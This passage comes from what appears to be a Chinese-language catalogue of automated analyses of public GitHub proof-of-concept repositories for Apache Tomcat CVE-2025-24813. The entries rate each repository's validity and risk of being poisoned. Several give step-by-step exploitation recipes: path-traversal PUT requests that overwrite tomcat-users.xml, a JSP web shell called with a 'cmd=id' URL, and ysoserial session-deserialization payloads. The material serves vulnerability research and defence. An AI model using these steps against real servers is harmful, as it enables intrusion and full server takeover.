2.  **远程代码执行：** 如果满足条件 writes enabled for the default servlet, support for partial PUT, application was using Tomcat's file based session persistence with the default storage location, application included a library that may be leveraged in a deserialization attack，则可利用反序列化漏洞执行远程代码。
3.  **PoC 利用：** PoC脚本首先解析目标URL，然后发送精心构造的PUT请求到目标服务器。如果服务器存在漏洞，并且满足利用条件，攻击者可以实现远程代码执行或信息泄露。

**项目地址:** [iSee857/CVE-2025-24813-PoC](https://github.com/iSee857/CVE-2025-24813-PoC)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #34

**来源**: [CVE-2025-24813-imbas007_CVE-2025-24813-apache-tomcat.md](../2025/CVE-2025-24813-imbas007_CVE-2025-24813-apache-tomcat.md)

## CVE-2025-24813-Apache Tomcat Path Equivalence-RCE/信息泄露

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/远程代码执行/信息泄露

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行，信息泄露以及服务器完全控制

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 需要 writes enabled for the default servlet (默认禁用), support for partial PUT (默认启用), application 使用 Tomcat 的基于文件的 session 持久化，默认存储位置, application 包含可用于反序列化攻击的库。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞。攻击者可以利用此漏洞绕过安全限制，通过精心设计的目录遍历序列覆盖关键配置文件，部署 web shell，并可能实现远程代码执行 (RCE)。

**有效性：**
提供的 Nuclei 模板（CVE-2025-24813.yaml）似乎有效。它包含三个请求：
1.  **PUT 请求覆盖 tomcat-users.xml：** 用于创建一个新的管理员用户，从而允许未经授权的访问。
2.  **PUT 请求部署 JSP Web Shell：** 用于在服务器上部署一个简单的 Web Shell，允许执行任意命令。
3.  **GET 请求执行 `id` 命令：**  用于验证 Web Shell 是否已成功部署并且可以执行命令。

该模板使用匹配器来验证请求是否成功，并提取相关信息。`README.md` 文件还提供了关于如何使用该模板和执行 Web Shell 的说明。

**投毒风险：**
虽然 POC 代码本身的目的在于利用漏洞，但其中潜在的投毒风险较低（约 5%）。风险主要存在于以下几个方面：
1.  **Web Shell 功能：** Web Shell 允许执行任意命令，如果攻击者在测试环境之外使用它，可能会造成恶意行为。虽然提供的 Web Shell 相对简单，但攻击者可以修改它以包含恶意功能，例如下载和执行其他恶意软件。
2.  **配置文件覆盖：** 覆盖 `tomcat-users.xml` 文件虽然是利用漏洞的一部分，但如果攻击者使用恶意配置替换该文件，可能会导致服务器不稳定或更容易受到其他攻击。
3.  **第三方依赖：** Nuclei 模板本身依赖于 Nuclei 工具。如果 Nuclei 工具被篡改，则可能存在其他风险。

总体而言，直接投毒的风险较低，因为代码主要集中在利用已知漏洞上。然而，通过 Web Shell 执行恶意操作的可能性仍然存在。

**利用方式：**
利用 CVE-2025-24813 漏洞的步骤如下：
1.  **利用路径等价漏洞：** 攻击者利用 Tomcat 默认 servlet 处理文件上传时存在的路径等价漏洞。通过在文件名中使用 ".." 序列，攻击者可以绕过目录限制，将文件上传到 Tomcat 配置目录或 Web 应用程序的根目录。
2.  **覆盖 `tomcat-users.xml` 文件：** 攻击者使用 PUT 请求将包含恶意用户的 `tomcat-users.xml` 文件上传到 `../conf/` 目录。此文件覆盖现有的 `tomcat-users.xml` 文件，从而创建一个具有管理员权限的新用户。
3.  **部署 Web Shell：** 攻击者使用 PUT 请求将 JSP Web Shell 文件上传到 Web 应用程序的根目录（`../webapps/ROOT/`）。此 Web Shell 允许攻击者在服务器上执行任意命令。
4.  **执行任意命令：** 攻击者使用浏览器访问 Web Shell 的 URL，并通过 `cmd` 参数执行任意命令。例如，`http://target.com/updates.jsp?cmd=id` 命令将显示服务器的用户 ID 信息。

**需要注意的是，默认情况下，Tomcat 的 default servlet 的写入是禁用的，需要手动启用。** 除此之外，如果启用了基于文件的 session 持久化，并且应用包含了可用于反序列化攻击的库，则可以通过上传恶意的 session 文件来实现 RCE。

攻击者可以通过上传恶意文件，执行任意代码，并完全控制受影响的 Tomcat 服务器。

**项目地址:** [imbas007/CVE-2025-24813-apache-tomcat](https://github.com/imbas007/CVE-2025-24813-apache-tomcat)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #35

**来源**: [CVE-2025-24813-issamjr_CVE-2025-24813-Scanner.md](../2025/CVE-2025-24813-issamjr_CVE-2025-24813-Scanner.md)

## CVE-2025-24813 - Apache Tomcat Path Equivalence / Deserialization RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE) / 信息泄露 / 文件篡改

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 9.0.0.M1 to 9.0.98, 10.1.0-M1 to 10.1.34, 11.0.0-M1 to 11.0.2

**利用条件:** 需要满足多个条件，包括：默认Servlet的写入启用（默认禁用），支持partial PUT（默认启用），特定的目录结构，攻击者需要了解敏感文件名，应用使用Tomcat的文件会话持久性（默认位置）并且包含可用于反序列化攻击的库。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813是Apache Tomcat中的一个高危漏洞，涉及路径等价性（内部点）问题，可能导致远程代码执行（RCE）、信息泄露或恶意内容添加到上传的文件。该漏洞利用了Tomcat对包含内部点的文件名处理不当，结合启用的Default Servlet写入功能和Partial PUT支持。如果攻击者能够满足所有前提条件，则可以上传恶意JSP文件或通过反序列化漏洞执行任意代码。从github仓库提供的python脚本来看，该脚本只是检测是否存在漏洞，并不能实现真正的利用。该仓库存在一定的投毒风险，可能性为10%， 主要体现在作者可能在后续版本中添加恶意代码，例如反弹shell或植入后门等，但当前提供的版本并未发现明显的恶意行为。

**项目地址:** [issamjr/CVE-2025-24813-Scanner](https://github.com/issamjr/CVE-2025-24813-Scanner)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #36

**来源**: [CVE-2025-24813-maliqto_PoC-CVE-2025-24813.md](../2025/CVE-2025-24813-maliqto_PoC-CVE-2025-24813.md)

## CVE-2025-24813 - Apache Tomcat 路径等价和反序列化漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/反序列化

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 9.0.0.M1 - 9.0.98, 10.1.0-M1 - 10.1.34, 11.0.0-M1 - 11.0.2

**利用条件:** Default Servlet 开启写入 (默认关闭), 支持Partial PUT (默认开启), 应用使用Tomcat的文件Session持久化存储(默认位置), 存在可用于反序列化攻击的库

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个高危漏洞，源于路径等价（Path Equivalence）问题和不安全的反序列化。

**漏洞利用方式：**

1.  **路径等价和信息泄露/恶意内容注入：** 如果 Tomcat 启用了 Default Servlet 的写入功能（`writes enabled for the default servlet`），并支持 partial PUT（`support for partial PUT`），且存在一个安全敏感文件上传的目标 URL 是公共上传 URL 的子目录，攻击者知晓敏感文件名，并使用 partial PUT 上传，则攻击者可能能够查看敏感文件或向其中注入恶意内容。
2.  **反序列化导致远程代码执行：** 如果 Tomcat 启用了 Default Servlet 的写入功能，支持 partial PUT，且应用程序使用了 Tomcat 的基于文件 Session 持久化存储（使用默认存储位置），并且应用程序包含一个可以用于反序列化攻击的库，那么攻击者可能执行远程代码。

**POC 有效性：**

提供的 POC 代码 `poc-cve.py`  是一个 Python 脚本，用于检测和利用 CVE-2025-24813 漏洞。它包含以下功能：

*   检测 Default Servlet 是否可写（通过 PUT 方法）。
*   生成 ysoserial payload 用于反序列化攻击。
*   通过 PUT 方法上传恶意 payload 到 session 文件，从而触发反序列化漏洞。

根据漏洞信息和 POC 代码，此 POC 具备有效性，可以在满足漏洞利用条件的环境中实现远程代码执行。

**投毒风险分析：**

仔细检查了提供的 Python 脚本 `poc-cve.py` 和 `README.md`。代码主要用于生成和上传恶意 payload，利用反序列化漏洞执行命令。以下是风险评估：

*   **高风险部分**  使用了 `ysoserial.jar`，如果下载源被篡改，可能会引入恶意代码。但脚本本身只是调用 `ysoserial.jar`，并没有直接包含恶意逻辑。
*   **潜在风险** 脚本在生成 payload 过程中，如果 `ysoserial.jar`  被替换为恶意版本，或者脚本中的命令注入点被恶意修改，可能导致投毒。
*   **低风险部分**  脚本中包含删除临时文件的函数 `remove_file`，这有助于清理攻击痕迹，本身不属于投毒行为。

综合评估，该仓库存在一定的投毒风险，主要集中在 ysoserial 的依赖和命令注入的可能性上。考虑到代码的整体结构和目的，以及作者声明的教育目的，直接包含恶意代码的可能性较低。风险评估百分比为10%。主要是考虑到使用者可能会误用或在不安全的环境中使用。

**总结：**

CVE-2025-24813 是一个需要多种条件才能触发的漏洞。 POC 实现了漏洞利用，但存在一定的投毒风险，主要是依赖外部工具 `ysoserial` 且需要谨慎使用。


**项目地址:** [maliqto/PoC-CVE-2025-24813](https://github.com/maliqto/PoC-CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #37

**来源**: [CVE-2025-24813-manjula-aw_CVE-2025-24813.md](../2025/CVE-2025-24813-manjula-aw_CVE-2025-24813.md)

## CVE-2025-24813-Apache Tomcat-RCE/信息泄露/文件篡改

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行/信息泄露/文件篡改

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行、敏感信息泄露和文件篡改

**影响版本:** 9.0.0.M1 <= version <= 9.0.98, 10.1.0-M1 <= version <= 10.1.34, 11.0.0-M1 <= version <= 11.0.2

**利用条件:** 需要满足以下条件：1. 启用了DefaultServlet的写入功能（默认禁用）；2. 启用了partial PUT支持（默认启用）；3. 对于RCE，需要应用程序使用Tomcat基于文件的会话持久化，并且包含可用于反序列化攻击的库；对于信息泄露和文件篡改，攻击目标URL是公共上传URL的子目录，且攻击者知道要上传的敏感文件名称,并且敏感文件也通过partial PUT上传。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-24813是Apache Tomcat中的一个路径等价漏洞，利用 'file.Name' (Internal Dot) 导致远程代码执行（RCE）和/或信息泄露和/或通过写入启用的 Default Servlet 将恶意内容添加到上传的文件中。根据漏洞描述和搜索结果，此漏洞利用需要特定配置才能成功。利用方式涉及通过 partial PUT 请求上传恶意构造的文件。提供的POC代码包含三个主要脚本：`01-prepare-environment.sh` 用于配置Tomcat环境，包括启用 DefaultServlet 的写入功能、配置会话持久化（RCE所需），以及下载必要的依赖（ysoserial和commons-collections）；`03-test.sh` 用于构造和发送包含恶意payload的PUT请求，使用ysoserial生成payload，利用CommonsCollections5链执行命令 `touch /tmp/pwndtomcat`。漏洞利用的关键在于 `Content-Range` 头部，该头部用于执行 partial PUT 请求，从而允许攻击者利用路径等价漏洞。该脚本通过修改Content-Range头部中的长度字段，来绕过一些安全检查，实现恶意payload的上传和执行。

**有效性：** 提供的POC代码有效，如果目标环境满足漏洞利用的先决条件（启用了DefaultServlet的写入功能，支持partial PUT，以及特定的部署配置），则可以成功利用该漏洞进行RCE或文件篡改/信息泄露。

**投毒风险：** 经过对POC代码的分析，未发现明显的投毒代码。该POC的目的是重现和利用CVE-2025-24813漏洞。脚本的行为符合漏洞利用的预期步骤，没有发现作者隐藏的恶意行为。所有操作都与漏洞利用直接相关。因此，投毒风险评估为0%。

**利用方式：**
1.  **环境准备：** 使用 `01-prepare-environment.sh` 脚本配置Tomcat环境，使其满足漏洞利用的先决条件（例如，启用写入的DefaultServlet，配置基于文件的会话管理）。
2.  **Payload生成：** 使用 `ysoserial` 工具生成恶意序列化 payload。  该 payload 会在目标服务器上执行任意命令。
3.  **Partial PUT 请求：**  使用 `03-test.sh` 脚本，通过精心构造的带有 `Content-Range` 头的 HTTP PUT 请求将 payload 发送到 Tomcat 服务器。 `Content-Range` 头的构造是利用漏洞的关键步骤。 
4.  **RCE/信息泄露/文件篡改：**  如果一切顺利，Tomcat 服务器会反序列化恶意 payload，导致在服务器上执行任意代码（RCE）或修改服务器上的文件，导致信息泄露或文件篡改。

**项目地址:** [manjula-aw/CVE-2025-24813](https://github.com/manjula-aw/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #38

**来源**: [CVE-2025-24813-mbanyamer_Apache-Tomcat---Remote-Code-Execution-via-Session-Deserialization-CVE-2025-24813-.md](../2025/CVE-2025-24813-mbanyamer_Apache-Tomcat---Remote-Code-Execution-via-Session-Deserialization-CVE-2025-24813-.md)

## CVE-2025-24813-Apache Tomcat-RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行

**影响应用:** Apache Tomcat

**危害等级:** 高危，可完全控制服务器

**影响版本:** 9.0.0.M1 <= version <= 9.0.98, 10.1.0-M1 <= version <= 10.1.34, 11.0.0-M1 <= version <= 11.0.2

**利用条件:** 默认Servlet开启写入(disabled by default), 支持Partial PUT(默认开启), 使用Tomcat文件Session持久化默认位置，应用包含可用于反序列化的库

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞，通过构造包含内部点（例如 file.Name）的文件名，结合启用的默认Servlet写入和部分PUT支持，可能导致远程代码执行和/或信息泄露。POC利用方式如下：

1.  **检查先决条件：** 检查目标Tomcat实例是否满足利用条件：默认Servlet的写入是否开启，Partial PUT是否支持（默认开启），是否使用了基于文件的Session持久化，以及是否包含可利用的反序列化库。
2.  **构造恶意Payload：** 使用 ysoserial 工具生成恶意的序列化 Java Payload，该 Payload 包含要执行的命令。
3.  **上传Payload：** 通过 PUT 请求将Payload上传到Tomcat服务器的Session存储目录。利用路径遍历(../)绕过上传限制，将恶意Session文件上传到 `uploads/../sessions/` 目录下.
4.  **触发反序列化：**  向服务器发送包含特定Session ID的请求，触发Tomcat加载恶意的Session文件，导致反序列化漏洞被触发，执行Payload中的命令。
5. **验证和清理：** 验证命令是否成功执行，并清理上传的恶意Session文件。

**有效性评估：**
根据漏洞库信息、搜索结果以及漏洞利用代码，可以判断该漏洞利用代码是有效的。搜索结果显示该漏洞已被积极利用。

**投毒风险评估：**
仔细分析了提供的POC代码，没有发现作者有意隐藏的投毒代码。代码逻辑清晰，功能明确，主要是利用ysoserial生成payload，然后通过PUT请求上传，最后触发。



**项目地址:** [mbanyamer/Apache-Tomcat---Remote-Code-Execution-via-Session-Deserialization-CVE-2025-24813-](https://github.com/mbanyamer/Apache-Tomcat---Remote-Code-Execution-via-Session-Deserialization-CVE-2025-24813-)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #39

**来源**: [CVE-2025-24813-michael-david-fry_Apache-Tomcat-Vulnerability-POC-CVE-2025-24813.md](../2025/CVE-2025-24813-michael-david-fry_Apache-Tomcat-Vulnerability-POC-CVE-2025-24813.md)

## CVE-2025-24813 - Apache Tomcat 路径等价和反序列化漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价 / 反序列化

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行、信息泄露或恶意内容注入

**影响版本:** 9.0.0.M1 <= version <= 9.0.98, 10.1.0-M1 <= version <= 10.1.34, 11.0.0-M1 <= version <= 11.0.2

**利用条件:** 对于RCE：Default Servlet 开启写入，支持Partial PUT，使用了Tomcat文件session持久化默认位置，存在可利用的反序列化库。对于信息泄露/内容注入：Default Servlet 开启写入，支持Partial PUT，存在敏感文件上传目录是公共上传目录的子目录，攻击者已知敏感文件名，使用Partial PUT上传敏感文件。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813是Apache Tomcat中的一个漏洞，涉及路径等价（'file.Name' 中的内部点）可能导致远程代码执行 (RCE)、信息泄露，或通过启用写入的默认Servlet向上传的文件添加恶意内容。漏洞存在于多个Tomcat版本：9.0.0.M1到9.0.98，10.1.0-M1到10.1.34，以及11.0.0-M1到11.0.2。

根据漏洞描述，如果Default Servlet启用了写入（默认禁用），支持Partial PUT（默认启用），并且应用程序使用了Tomcat的基于文件的会话持久化以及默认存储位置，同时应用程序包含可用于反序列化攻击的库，则可能导致RCE。另外，如果Default Servlet启用了写入，支持Partial PUT，并且存在安全敏感文件上传的目标URL是公共上传目标URL的子目录，攻击者已知安全敏感文件的名称，并且安全敏感文件也是通过partial PUT上传，攻击者可以查看安全敏感文件或向其中注入内容。

提供的PoC代码 (CVE-2025-24813.py) 旨在执行非侵入性检查，以验证目标服务器是否容易受到攻击。它首先尝试从HTTP Server标头中提取Tomcat版本。然后，它尝试通过HTTP PUT在目标上创建一个名为“CVE-2025-24813-check.txt”的文件，如果成功，则删除该文件。这用于确定DefaultServlet是否已启用写入。最后，它尝试检索会话ID。该脚本接受CSV文件作为输入，并在报告文件中记录所有操作。

**有效性：** 根据搜索结果，CVE-2025-24813已被利用，这表明该漏洞确实存在，并且可以被利用。提供的PoC代码主要用于检测漏洞的存在，而不是直接利用RCE或信息泄露。

**投毒风险：** PoC代码中，主要功能是进行版本检测和判断DefaultServlet是否开启写入权限。在提供的代码片段中，没有明显的恶意代码。但是仍存在一定的风险（估计为10%），例如：

1.  **依赖项风险：** 脚本使用了 `requests` 库，如果该库本身被篡改（例如通过PyPI投毒），可能会引入恶意代码。
2.  **报告文件：**  报告文件可能包含敏感信息，如果报告文件被上传到公共位置，可能导致信息泄露。
3.  **脚本维护者风险：** 如果脚本的维护者受到恶意攻击或者本身就是恶意用户，可能会在后续版本中添加恶意代码。

**利用方式：**

1.  **RCE (远程代码执行):**  攻击者需要满足多个条件，包括Default Servlet开启写入，支持Partial PUT，使用了Tomcat文件session持久化默认位置，存在可利用的反序列化库。攻击者利用Partial PUT上传恶意序列化数据到Tomcat的session文件，从而执行任意代码。
2.  **信息泄露/内容注入：**  攻击者需要满足多个条件，包括Default Servlet开启写入，支持Partial PUT，存在敏感文件上传目录是公共上传目录的子目录，攻击者已知敏感文件名，使用Partial PUT上传敏感文件。攻击者利用Partial PUT覆盖或修改敏感文件。

总的来说，该漏洞的利用需要特定配置和条件，提供的PoC主要用于初步检测，实际利用需要更复杂的攻击步骤。

**项目地址:** [michael-david-fry/Apache-Tomcat-Vulnerability-POC-CVE-2025-24813](https://github.com/michael-david-fry/Apache-Tomcat-Vulnerability-POC-CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #40

**来源**: [CVE-2025-24813-msadeghkarimi_CVE-2025-24813-Exploit.md](../2025/CVE-2025-24813-msadeghkarimi_CVE-2025-24813-Exploit.md)

## CVE-2025-24813 Apache Tomcat RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE) / 信息泄露

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 默认Servlet开启写入 (disabled by default), 支持partial PUT (enabled by default), 使用Tomcat文件session持久化默认位置,应用包含可用于反序列化攻击的库

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813是一个Apache Tomcat中的路径等价漏洞，利用内部点(file.Name)导致远程代码执行和/或信息泄露，和/或恶意内容被添加到上传的文件中，通过默认Servlet写入。根据漏洞库信息，如果满足以下条件，攻击者可以查看敏感文件或注入内容：

*   默认Servlet开启写入 (默认关闭)
*   支持Partial PUT（默认开启）
*   安全敏感上传的目标URL是公共上传目标URL的子目录
*   攻击者知道被上传的安全敏感文件的名称
*   安全敏感文件也通过Partial PUT上传

如果满足以下条件，攻击者可以执行远程代码：

*   默认Servlet开启写入 (默认关闭)
*   支持Partial PUT（默认开启）
*   应用使用Tomcat基于文件的session持久化，使用默认存储位置
*   应用包含一个可以用于反序列化攻击的库

**漏洞利用方式：**

1.  **Partial PUT上传恶意文件：** 利用Tomcat的Partial PUT功能，攻击者可以分块上传恶意文件到服务器。
2.  **路径遍历：**  通过构造包含`file.Name`（内部点）的特殊文件名，绕过路径检查，将恶意文件写入到Tomcat session存储目录，或者其他任意可写目录。
3.  **反序列化漏洞利用：** 如果应用程序包含一个可以被利用的反序列化库，上传的恶意文件可以触发反序列化漏洞，从而执行任意代码。
4.  **RCE:** 通过上传包含恶意代码的session文件,利用反序列化漏洞，实现远程代码执行。

**POC分析：**

提供的Python POC脚本尝试利用此漏洞。它执行以下步骤：

1.  **发送PUT请求：** 脚本向目标服务器发送PUT请求，尝试创建一个session文件。请求头包含Content-Length和Content-Range，模拟Partial PUT请求。
2.  **检查响应状态码：** 如果PUT请求返回409冲突状态码，表示服务器可能存在漏洞。
3.  **发送GET请求：** 脚本发送一个GET请求，其中Cookie包含一个伪造的JSESSIONID，尝试触发session反序列化。
4.  **检查响应状态码：** 如果GET请求返回500错误，表明session反序列化可能成功，漏洞可能存在。

**有效性：**

该POC代码尝试了利用该漏洞，但是否能够成功利用取决于目标服务器的具体配置和环境。需要满足上述所有条件漏洞才能成功利用。鉴于github上存在该漏洞的POC,故判断POC有效。

**投毒风险：**

该POC代码的主要目的是检测漏洞是否存在，而不是直接执行恶意操作。但是，`PAYLOAD`变量中包含一个base64编码的字符串，这可能包含一个反序列化payload。攻击者可能在`PAYLOAD`中注入恶意代码。

从代码逻辑来看，脚本首先发送一个PUT请求，如果返回409，则发送一个包含特定Cookie的GET请求。如果GET请求返回500，则认为目标存在漏洞。这个过程相对简单，没有明显的恶意行为。

但是，由于`PAYLOAD`的内容是未知的（被截断），存在一定的风险。如果`PAYLOAD`包含恶意代码，并且在目标服务器上成功执行，那么可能会导致安全问题。考虑到作者使用了看起来正常的请求参数，并且代码主要用于检测漏洞，因此判断投毒风险较低，约为10%。剩下的90%是为了验证此漏洞是否可以使用。

**项目地址:** [msadeghkarimi/CVE-2025-24813-Exploit](https://github.com/msadeghkarimi/CVE-2025-24813-Exploit)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #41

**来源**: [CVE-2025-24813-n0n-zer0_Spring-Boot-Tomcat-CVE-2025-24813.md](../2025/CVE-2025-24813-n0n-zer0_Spring-Boot-Tomcat-CVE-2025-24813.md)

## CVE-2025-24813-Apache Tomcat-RCE/信息泄露/恶意内容注入

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行/信息泄露/恶意内容注入

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行、敏感信息泄露或恶意内容被注入到上传的文件中

**影响版本:** 9.0.0.M1 - 9.0.98, 10.1.0-M1 - 10.1.34, 11.0.0-M1 - 11.0.2

**利用条件:** 默认Servlet开启写入、支持partial PUT、存在特定的目录结构、攻击者需要了解敏感文件名、使用Tomcat文件会话保持且为默认存储位置、存在可用于反序列化攻击的库

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813是Apache Tomcat中的一个路径等价漏洞，由于Tomcat在处理包含内部点（file.Name）的文件名时存在缺陷，结合Default Servlet的写入功能，可能导致远程代码执行、信息泄露或将恶意内容添加到上传的文件中。

**漏洞利用有效性：**
根据搜索结果和漏洞库信息，CVE-2025-24813被广泛认为是可利用的，并且已经出现公开的利用方法。多个安全厂商和CERT机构发布了关于该漏洞的警告，部分报告指出该漏洞已经在野外被利用，因此该漏洞利用的有效性较高。

**投毒风险分析：**
提供的漏洞利用代码看起来像是 Maven Wrapper 脚本。Maven Wrapper 本身是一个工具，用于确保项目使用特定版本的 Maven 构建工具。这个脚本的功能是下载和执行指定版本的 Maven。因此，直接在这个脚本中进行投毒相对困难。但是，仍然存在一些潜在的投毒风险点：

1.  **distributionUrl篡改：** 攻击者可以修改 `.mvn/wrapper/maven-wrapper.properties` 文件中的 `distributionUrl` 属性，将其指向一个恶意的 Maven 发行版。这个恶意的 Maven 发行版可能包含后门或恶意代码，当开发者或构建系统使用 Maven Wrapper 构建项目时，就会执行这些恶意代码。
2.  **伪造 Maven 仓库：** 攻击者可以搭建一个伪造的 Maven 仓库，拦截 Maven Wrapper 下载 Maven 发行版的请求。这个伪造的 Maven 仓库可以返回一个包含后门的 Maven 发行版。

考虑到 Maven Wrapper 脚本本身的性质，以及通常会对下载的 Maven 发行版进行校验，直接投毒的概率较低，估计在5%左右。但也不能完全排除，因为攻击者可以通过社会工程学等手段诱导用户使用被篡改的 `distributionUrl`。

**漏洞利用方式：**
根据漏洞描述，漏洞利用方式取决于满足的条件：

1.  **信息泄露/恶意内容注入：** 如果满足以下所有条件：
    *   Default Servlet 开启写入功能。
    *   支持 partial PUT 请求。
    *   存在一个公共上传目录的子目录，作为安全敏感文件的目标 URL。
    *   攻击者了解安全敏感文件的名称。
    *   安全敏感文件也通过 partial PUT 上传。
    攻击者可以利用路径等价漏洞读取敏感文件或向其中注入恶意内容。

2.  **远程代码执行：** 如果满足以下所有条件：
    *   Default Servlet 开启写入功能。
    *   支持 partial PUT 请求。
    *   应用程序使用 Tomcat 的文件会话保持机制，且为默认存储位置。
    *   应用程序包含一个可以被用于反序列化攻击的库。
    攻击者可以利用路径等价漏洞将恶意序列化数据写入到会话文件中，并触发反序列化漏洞，从而执行任意代码。

**总结：**
CVE-2025-24813 是一个高危漏洞，需要尽快进行修复。在修复之前，应该禁用 Default Servlet 的写入功能，并限制 partial PUT 请求的使用。同时，应该对 Maven Wrapper 脚本进行安全审计，确保其指向的 Maven 发行版是可信的。

**项目地址:** [n0n-zer0/Spring-Boot-Tomcat-CVE-2025-24813](https://github.com/n0n-zer0/Spring-Boot-Tomcat-CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #42

**来源**: [CVE-2025-24813-naikordian_CVE-2025-24813.md](../2025/CVE-2025-24813-naikordian_CVE-2025-24813.md)

## CVE-2025-24813-Apache Tomcat-RCE/信息泄露/文件篡改

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行/信息泄露/文件篡改

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行，敏感信息泄露以及文件被恶意篡改

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** RCE：1. writes enabled for the default servlet (disabled by default); 2. support for partial PUT (enabled by default); 3. application was using Tomcat's file based session persistence with the default storage location; 4. application included a library that may be leveraged in a deserialization attack.
信息泄露/文件篡改：1. writes enabled for the default servlet (disabled by default); 2. support for partial PUT (enabled by default); 3. a target URL for security sensitive uploads that was a sub-directory of a target URL for public uploads; 4. attacker knowledge of the names of security sensitive files being uploaded; 5. the security sensitive files also being uploaded via partial PUT

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等效漏洞，利用 'file.Name' (内部点) 导致远程代码执行 (RCE) 和/或信息泄露和/或通过在 Apache Tomcat 中启用写入的默认 Servlet 将恶意内容添加到上传的文件中。

**有效性：** 根据搜索引擎结果以及漏洞库信息，该漏洞存在PoC，并且已经被利用，因此判断PoC有效。

**投毒风险：** 提供的漏洞利用代码只包含一个`README.md`文件，仅包含 CVE-2025-24813 的名称信息，无法进行漏洞利用。但根据其他的搜索结果，已经存在公开可用的PoC，因此投毒风险较低，但也存在被替换成恶意PoC的可能，估计投毒风险为10%。

**利用方式：**

1.  **信息泄露/文件篡改：**
    *   首先，需要启用 Default Servlet 的写入功能（默认禁用）。
    *   Tomcat 必须支持 partial PUT（默认启用）。
    *   存在一个安全敏感文件上传的目标 URL，该 URL 是公共文件上传目标 URL 的子目录。
    *   攻击者需要知道安全敏感文件的名称。
    *   安全敏感文件通过 partial PUT 进行上传。
    *   利用路径等效（'file.Name' 中的内部点）来访问和修改安全敏感文件。

2.  **远程代码执行 (RCE)：**
    *   需要启用 Default Servlet 的写入功能（默认禁用）。
    *   Tomcat 必须支持 partial PUT（默认启用）。
    *   应用需要使用 Tomcat 基于文件的会话持久性，并使用默认存储位置。
    *   应用程序需要包含一个可用于反序列化攻击的库。
    *   通过上传包含恶意序列化数据的会话文件，实现远程代码执行。

**项目地址:** [naikordian/CVE-2025-24813](https://github.com/naikordian/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #43

**来源**: [CVE-2025-24813-ps-interactive_lab-cve-2025-24813.md](../2025/CVE-2025-24813-ps-interactive_lab-cve-2025-24813.md)

## CVE-2025-24813-Apache Tomcat-路径遍历/反序列化RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径遍历/反序列化RCE

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致信息泄露和远程代码执行

**影响版本:** 9.0.0.M1 <= version <= 9.0.98, 10.1.0-M1 <= version <= 10.1.34, 11.0.0-M1 <= version <= 11.0.2

**利用条件:** 1. 默认Servlet启用写入 (默认禁用)
2. 支持部分PUT (默认启用)
3. 对于信息泄露/文件注入：目标URL是公共上传目标URL的子目录；攻击者知道安全敏感文件的名称；安全敏感文件也通过部分PUT上传。
4. 对于RCE：应用程序使用Tomcat基于文件的会话持久性与默认存储位置；应用程序包含一个可以在反序列化攻击中利用的库。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

